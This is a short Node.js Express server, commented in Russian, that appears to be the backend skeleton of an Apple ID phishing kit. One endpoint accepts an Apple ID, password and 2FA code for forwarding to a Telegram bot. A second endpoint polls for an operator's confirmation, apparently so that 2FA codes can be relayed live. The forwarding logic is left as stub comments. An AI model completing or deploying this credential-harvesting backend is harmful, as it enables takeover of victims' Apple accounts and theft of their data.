const express = require('express');
const path = require('path');
const app = express();

// Middleware
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

// Основной маршрут
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// API для отправки данных в Telegram
app.post('/api/send-to-telegram', async (req, res) => {
    try {
        const { appleId, password, code2fa, is2FA } = req.body;
        
        // Здесь будет логика отправки в Telegram
        // Используйте BOT_TOKEN и CHAT_ID из переменных окружения
        
        res.json({ success: true, message: 'Данные отправлены' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// API для проверки подтверждения
app.get('/api/check-confirmation', async (req, res) => {
    try {
        // Здесь будет логика проверки callback-запросов от Telegram
        res.json({ confirmed: false });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Запуск сервера
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Сервер запущен на порту ${PORT}`);
});
